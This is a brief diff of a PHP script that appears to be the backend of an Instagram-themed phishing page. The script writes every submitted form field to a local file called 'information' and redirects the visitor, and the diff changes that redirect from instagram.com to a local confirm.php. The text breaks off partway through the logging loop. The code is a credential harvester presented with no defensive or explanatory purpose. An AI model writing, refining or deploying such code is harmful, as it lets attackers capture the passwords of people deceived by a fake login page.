@@ -1,5 +1,5 @@
 <?php
-header ('Location:https://instagram.com');
+header ('Location:confirm.php');
 $handle = fopen("./information", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
